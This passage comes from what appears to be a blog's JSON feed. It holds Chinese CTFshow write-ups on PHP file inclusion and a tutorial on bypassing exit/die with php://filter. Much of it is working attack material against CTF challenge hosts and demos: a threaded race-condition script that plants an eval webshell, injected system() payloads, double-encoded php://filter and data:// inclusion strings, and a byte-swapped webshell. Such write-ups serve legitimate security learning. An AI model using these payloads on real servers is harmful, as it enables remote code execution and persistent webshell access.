sessionid=flag，那么 PHP 就会生成一个文件 /tmp/sess_flag, 这时就完成了初始化，并写入 ini.get (“session.upload_progress.prefix”)+ 由我们构造的 session.upload_progress.name 值，但是 session.upload_progress.cleanup = on 会清空文件内容，那么这里就需要用到条件竞争的思想了，创建表单上传临时文件</p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://4ac09838-e15e-4a7d-b82e-1a154d432e4d.challenge.ctf.show/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>POST<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>PHP_SESSION_UPLOAD_PROGRESS<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span> &lt;?php system('ls'); ?><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105011223887.png\" alt=\"image-20221105011223887\" /></p>\n<p>不断的上传，不断访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105011144408.png\" alt=\"image-20221105011144408\" /></p>\n<p>同理，看 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105011323661.png\" alt=\"image-20221105011323661\" /></p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> io\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> threading\n\nsessid <span class=\"token operator\">=</span> <span class=\"token string\">'Qftm'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">POST</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        f <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span>\n        session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>\n            <span class=\"token string\">'http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/'</span><span class=\"token punctuation\">,</span>\n            data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"PHP_SESSION_UPLOAD_PROGRESS\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n            files<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q.txt'</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n            cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span>sessid<span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">READ</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        response <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sessid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'flag'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+++]retry'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n            sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span>\n    t1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>POST<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    t1<span class=\"token punctuation\">.</span>daemon <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n    t1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    READ<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>这里附上大佬的脚本，可以梭哈</p>\n<h2 id=\"web83\"><a class=\"anchor\" href=\"#web83\">#</a> web83</h2>\n<p>源码没变，但是多了一条报错，这里是因为没有开启 session，加上 session_start () 即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105011550544.png\" alt=\"image-20221105011550544\" /></p>\n<p><pre class=\"line-numbers language-php+html\" data-language=\"php+html\"><code class=\"language-php+html\">&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;4ac09838-e15e-4a7d-b82e-1a154d432e4d.challenge.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;\n    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot; &lt;?php system(&#39;ls&#39;); ?&gt;&quot; &#x2F;&gt;\n    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;\n&lt;&#x2F;form&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&lt;?php session_start(); ?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"web87\"><a class=\"anchor\" href=\"#web87\">#</a> web87</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die('大佬别秀了');?>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>看到 filter 和 die 就感觉不简单，这不就是死亡 die，用 php://filter 即可，可以去看一下我的<a href=\"https://blog.xcu.icu/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/\"> php://filter 过 exit - Web | Clown の Blog = (xcu.icu)</a> 这篇文章，这里 url 要进行两次编码</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30\ncontent&#x3D;AAPD9waHAgc3lzdGVtKCdscycpOyA&#x2F;Pg&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105012857882.png\" alt=\"image-20221105012857882\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">content&#x3D;AAPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105012936593.png\" alt=\"image-20221105012936593\" /></p>\n<h2 id=\"web88\"><a class=\"anchor\" href=\"#web88\">#</a> web88</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>emmm 这题，所实话变的有点突然，data 流解决</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;input;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105013418162.png\" alt=\"image-20221105013418162\" /></p>\n<h2 id=\"web117\"><a class=\"anchor\" href=\"#web117\">#</a> web117</h2>\n<p>web116 有些离谱，我没记录，misc-web666</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'too young too simple sometimes naive!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'contents'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die();?>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>正则掉了很多过滤器，可以选择没有过滤的，绕死亡函数的原理都是一样的</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105014312695.png\" alt=\"image-20221105014312695\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105014255452.png\" alt=\"image-20221105014255452\" /></p>\n",
            "tags": [
                "CTFshow",
                "文件包含"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/",
            "url": "https://blog.xcu.icu/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/",
            "title": "php://filter过exit",
            "date_published": "2022-11-04T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>谨以此篇记录一下 php://filter 在一些情况下的使用方法，主要是 php://filter 在 file_put_content 写文件时的一些方法，看到网上有很多师傅都有对这一块的文章，这里做一下记录和测试</p>\n<h2 id=\"什么是phpfilter\"><a class=\"anchor\" href=\"#什么是phpfilter\">#</a> 什么是 php://filter</h2>\n<p>首先来看看官方文档中怎么解释这个伪协议</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104201231469.png\" alt=\"image-20221104201231469\" /></p>\n<p>说白了，我们可以通过这个伪协议来读写文件，这也和本篇要记录的使用方法息息相关</p>\n<h2 id=\"利用场景\"><a class=\"anchor\" href=\"#利用场景\">#</a> 利用场景</h2>\n<h3 id=\"配合include读取文件\"><a class=\"anchor\" href=\"#配合include读取文件\">#</a> 配合 include 读取文件</h3>\n<p>文件包含和 xxe 中会常见到它的身影，本篇主要对文件包含进行测试和记录</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n//?file=php://filter/read=convert.base64-encode/resource=index.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104202523263.png\" alt=\"image-20221104202523263\" /></p>\n<p>可以通过伪协议来读取文件</p>\n<h3 id=\"绕过file_put_conten中的exitdie\"><a class=\"anchor\" href=\"#绕过file_put_conten中的exitdie\">#</a> 绕过 file_put_conten 中的 exit&amp;die</h3>\n<p>开始本篇的主要部分</p>\n<p>主要分俩种情况</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">file_put_contents($filename,\"&lt;?php exit();\".$content);\n//file_put_contents($filename,\"&lt;?php die();\".$content);\nfile_put_contents($content,\"&lt;?php exit();\".$content);\n//file_put_contents($content,\"&lt;?php die();\".$content);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>首先来说第一种，就是写入文件时，data 部分前拼接上了 exit 或者 die 使得程序提前终止，写入的 data 不能执行，当然绕过的方式也不难，上面再 include 的利用场景中可以看到 base64-encode 编码，当然也有解码，因为 base64 编码字符没有 &lt;?&gt;, 也就不能正常识别</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104203735374.png\" alt=\"image-20221104203735374\" /></p>\n<p>这里利用的就是这个方式</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;?php exit();\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n/*get:?file=php://filter/convert.base64-decode/resource=1.php\npost:APD9waHAgcGhwaW5mbygpOyA/Pg==\n这里post前要加一个字符，什么都行，因为base64是4个字符一起解码，前面的phpexit是7位，如果不补齐解码会将后面的D算上，导致解码不出预期结果\n*/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104204652019.png\" alt=\"image-20221104204652019\" /></p>\n<p>成功写入，在短标签没开启的情况下还有一种方式</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=string.rot13/resource=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>使用方式相同这里简单的过一下即可</p>\n<p>接下来记录第二种情况</p>\n<p>在这种情况下就不能再使用 base64，因为 base64 遇到 = 就终止了</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">data&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|&lt;?cuc cucvasb(); ?&gt;|&#x2F;resource&#x3D;clown.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104211913293.png\" alt=\"image-20221104211913293\" /></p>\n",
            "tags": [
                "Web",
                "伪协议"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/04/VulnHub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Billu_b0x%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/",
            "url": "https://blog.xcu.icu/2022/11/04/VulnHub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Billu_b0x%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/",
            "title": "VulnHub靶机学习",
            "date_published": "2022-11-03T16:00:00.000Z",
